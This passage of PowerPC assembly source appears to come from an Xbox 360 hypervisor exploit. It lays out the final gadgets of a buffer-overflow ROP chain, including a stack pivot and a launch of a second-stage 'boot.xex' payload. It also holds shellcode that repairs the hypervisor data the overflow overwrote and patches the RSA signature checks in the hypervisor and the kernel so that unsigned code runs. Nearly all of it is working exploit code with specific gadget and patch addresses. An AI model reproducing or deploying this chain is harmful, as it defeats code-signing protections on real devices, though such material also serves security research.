        # bctrl                         # call ObCreateSymbolicLink and mount the hdd content folder
        # b         ...
        # ...
        # addi      r1, r1, 0x90        # prolog: prepare for next gadget
        # b         __restgprlr_26
        ###########################################################
		.fill   0x58, 1, 0x00
		.long	0x26262626, 0x26262626	# r26
		.long	0x27272727, 0x27272727	# r27
		.long   0x00000000, 0x00000000  # r28 - value to store (new memory access mask)
        .long   0x00000000, ROPGadget21 # r29 - next next gadget address
        .long   0x30303030, 0x30303030  # r30
        .long   0x00000000, KernelAccessMaskAddress - 0x14  # r31 - address to store value at
        .long   ROPGadget20             # lr - next gadget address
        .long   0x00000000              #
		
		###########################################################
        # Gadget 20: restore kernel memory access mask
        #
        # stw       r28, 0x14(r31)
        # mtctr     r29
        # bctrl
        ###########################################################
		
		###########################################################
        # Gadget 21: setup registers for next gadget
        #
        # addi      r1, r1, 0x80
        # b         __restgprlr_28
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x00000000, OriginalStackPointer  # r28 - dst = original stack pointer
        .long   0x00000000, (_buffer_overflow_end - _stack_data_part_2) / 2	# r29 - size of data to copy
        .long   0x30303030, 0x30303030  # r30
        .long   0x00000000, GapDataStartHeapAddress + (_8 - _gap_data_start) - 0x10  # r31 - pointer to memcpy src address
        .long   ROPGadget22             # lr - next gadget address
_8:     .long   GapDataStartHeapAddress + (_stack_data_part_2 - _gap_data_start)     # pointer to stack data to copy
		
		###########################################################
        # Gadget 22: memcpy - copy stack data to the real stack
        #
        # slwi      r5, r29, 2          # Size of the copy (PAGE_SIZE)
        # lwz       r4, 0x10(r31)       # Address of our shell code below
        # mr        r3, r28
        # bl        memcpy
        # addi      r1, r1, 0x80
        # b         __restgprlr_28
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x28282828, 0x28282828  # r28
        .long   0x00000000, 0x00000000	# r29 - flags for XLaunchNewImage
        .long   0x00000000, GapDataStartHeapAddress + (payload_file_path - _gap_data_start)	# r30 - file path to the second stage payload xex
        .long   0x00000000, XamLoaderLaunchTitle  # r31 - call address for gadget 24
        .long   ROPGadget23             # lr - next gadget address
		.long   0x00000000              # 
		
		###########################################################
        # Gadget 23: stack pivot
        #
        # lwz       r1, 0(r1)           # Perform the stack pivot (r1 = stack_data + 8)
        # lwz       r12, -8(r1)         # Load next gadget address
        # mtlr      r12
        # blr
        ###########################################################
		.long	OriginalStackPointer + 8	# Stack pointer to pivot to
		
_stack_data_part_2:

		.long	ROPGadget24				# lr - next gadget address
		.long	0x00000000

		###########################################################
        # Gadget 24: launch the second stage payload xex
        #
        # mr        r6, r27             # 
        # mr        r5, r28             # 
        # mr        r4, r29             # flags = 0
        # mr        r3, r30             # payload_file_path
        # mtctr     r31
        # bctrl                         # call XamLoaderLaunchTitle and launch the second stage xex
        ###########################################################

		# Pad the data to the next 4 byte boundary.
		.long	0x00000000

_buffer_overflow_end:

#---------------------------------------------------------
# Hypervisor/kernel shell code
#---------------------------------------------------------

_shell_code_start:

        ###########################################################
        # Hypervisor shell code entry point
        #
        # r4 = location of _shell_code_start in memory
        
        # Setup the stack frame.
        mflr    %r12
        std     %r12, -0x8(%r1)
        std     %r31, -0x10(%r1)
        addi    %r1, %r1, -0x40
        
        # Save the shellcode base address, we will need it later on.
        mr      %r31, %r4
        
        # Initialize the command buffer.
        li      %r11, 0 
        std     %r11, 0(%r1)
        std     %r11, 8(%r1)        # memset(abCommandBuffer, 0, 16)

        # Set the LED color command.
        li      %r11, 0x99          # LED color cmd
        stb     %r11, 0(%r1)
        li      %r11, 0xFF          # LED override
        stb     %r11, 1(%r1)
        li      %r11, 0xFF          # color = orange?
        stb     %r11, 2(%r1)
        
        # Send the command to the SMC.
        mr      %r3, %r1
        mr      %r11, %r31
        addi    %r11, %r11, (HvxSendSMCMessage - _shell_code_start)
        mtctr   %r11
        bctrl
		
		# Disable RMCI.
		li		%r3, 0
		li		%r11, 0xB64
		mtctr	%r11
		bctrl
		
		# Fix the hv data we trashed with the exploit.
		li		%r5, 1
		ld		%r29, (hv_restore_data_address - _shell_code_start)(%r31)
		mr		%r4, %r29													# dst = start of cache line we overwrote
		addi	%r3, %r31, (hv_restore_data - _shell_code_start)			# src = restore data address
		li		%r11, 0x14B8
		mtctr	%r11
		bctrl
		icbi	0, %r29
		
		# Apply patches to the hypervisor so we can run unsigned code.
		lis		%r4, 0x3860
		ori		%r4, %r4, 1		# opcode for 'li r3, 1'
		ld		%r3, (hv_rsa_patch_address - _shell_code_start)(%r31)
		stw		%r4, 0(%r3)
		
		li		%r5, 0x7F
		andc	%r3, %r3, %r5
		icbi	0, %r3
		
		# Apply patches to the kernel so we can run unsigned code.
		ld		%r3, (kernel_rsa_patch_address - _shell_code_start)(%r31)
		stw		%r4, 0(%r3)
		
		andc	%r3, %r3, %r5
		icbi	0, %r3
		
		# Enable RMCI.
		li		%r3, 1
		li		%r11, 0xB64
		mtctr	%r11
		bctrl
        
        # We must return 0 for the calling gadget to finish successfully.
        li      %r3, 0
        
        # Destroy the stack frame.
        addi    %r1, %r1, 0x40
        ld      %r31, -0x10(%r1)
        ld      %r12, -0x8(%r1)
        mtlr    %r12
        blr
        
        ###########################################################
        # HvxSendSMCMessage (r3 pMessageBuffer)
HvxSendSMCMessage:

        # Setup stack frame.
        mflr    %r12
        std     %r12, -0x8(%r1)
        std     %r31, -0x10(%r1)
        addi    %r1, %r1, -0x20
        
        # Setup the SMC's physical address.
        lis     %r31, 0x8000
        ori     %r31, %r31, 0x200
        rldicr  %r31, %r31, 32, 31
        oris    %r31, %r31, 0xEA00
        ori     %r31, %r31, 0x1000      # 0x80000200.EA001000

        # Wait for the SMC to become ready.
smc_rdy_loop:
        #lwz        %r11, 0x84(%r31)        # poll SMC status register
        #rlwinm.    %r11, %r11, 0, 29, 29
        #beq        smc_rdy_loop            # Loop until the smc is ready
        
        # Set the SMC status to busy.
        lis     %r11, 0x400
        stw     %r11, 0x84(%r31)
        eieio
        
        # Setup for command write loop.
        li      %r11, 4
        mtctr   %r11
        
        # Write the next 4 bytes of data to the SMC command register.
smc_write:
        lwz     %r11, 0(%r3)            # get next dword
        addi    %r3, %r3, 4
        stw     %r11, 0x80(%r31)        # write to SMC command register
        eieio
        bdnz    smc_write               # while (i-- > 0)
        
        # Set the SMC status to ready.
        li      %r11, 0
        stw     %r11, 0x84(%r31)
        eieio
        
        # Destroy stack frame.
        addi    %r1, %r1, 0x20
        ld      %r31, -0x10(%r1)
        ld      %r12, -0x8(%r1)
        mtlr    %r12
        blr
		
        
        ###########################################################
        # Data
		
hdd_symlink_mount_str:
		.ascii	"\\??\\PAYLOAD:"
		hdd_symlink_mount_str_length =			. - hdd_symlink_mount_str
		.byte	0x00
		.align	4
		
hdd_symlink_path_str:
		.ascii "\\Device\\Harddisk0\\Partition1\\Content"
		hdd_symlink_path_str_length =			. - hdd_symlink_path_str
		.byte	0x00
		.align	4
		
hdd_symlink_mount:
		.word	hdd_symlink_mount_str_length
		.word	hdd_symlink_mount_str_length + 1
		.long	GapDataStartHeapAddress + (hdd_symlink_mount_str - _gap_data_start)
		
hdd_symlink_path:
		.word	hdd_symlink_path_str_length
		.word	hdd_symlink_path_str_length + 1
		.long	GapDataStartHeapAddress + (hdd_symlink_path_str - _gap_data_start)
		
payload_file_path:
		.ascii	"PAYLOAD:\\boot.xex"
		.byte	0x00
		.align	4
		
hv_restore_data:
		.byte 0x00, 0x00, 0xC3, 0x70, 0x00, 0x00, 0x8C, 0x38, 0x00, 0x00, 0xA6, 0xE0, 0x00, 0x00, 0x68, 0x00
		.byte 0x00, 0x00, 0xB9, 0x28, 0x00, 0x00, 0xB9, 0x40, 0x00, 0x00, 0xB9, 0x48, 0x00, 0x00, 0xB9, 0xF0
		.byte 0x00, 0x00, 0x5C, 0xC8, 0x00, 0x00, 0x5E, 0x58, 0x00, 0x00, 0x5F, 0x58, 0x00, 0x00, 0x60, 0x68
		.byte 0x00, 0x00, 0x8F, 0x78, 0x00, 0x00, 0x90, 0x18, 0x00, 0x00, 0x91, 0x30, 0x00, 0x00, 0x92, 0x08
		.byte 0x00, 0x00, 0x93, 0x28, 0x00, 0x00, 0x94, 0x60, 0x00, 0x00, 0xC3, 0x78, 0x00, 0x00, 0xC3, 0x80
		.byte 0x00, 0x00, 0xC3, 0x88, 0x00, 0x00, 0x94, 0x70, 0x00, 0x00, 0x94, 0xE8, 0x00, 0x00, 0x95, 0x30
		.byte 0x00, 0x00, 0x95, 0x80, 0x00, 0x00, 0x95, 0xC8, 0x00, 0x00, 0x95, 0xD8, 0x00, 0x00, 0xC3, 0x90
		.byte 0x00, 0x00, 0xC3, 0x98, 0x00, 0x00, 0xC3, 0xA0, 0x00, 0x00, 0xC3, 0xA8, 0x00, 0x00, 0xC3, 0xB0
		
hv_restore_data_address:
		.long 0x00000000, 0x00002100				# Physical address of HvSyscallTableAddress aligned to the start of the cache line
		
hv_rsa_patch_address:
		.long 0x00000000, 0x000044C8				# Physical address of the 'bl XeCryptBnQwBeSigVerify' instruction in HvxCreateImageMapping
		
kernel_rsa_patch_address:
		.long 0x80000300, 0x00078080				# Physical address of the 'bl XeCryptBnQwBeSigVerify' instruction in XexpVerifyXexHeaders
            
_shell_code_end:
_gap_data_end:

#---------------------------------------------------------
# End of file
#---------------------------------------------------------
.long 0xffffffff
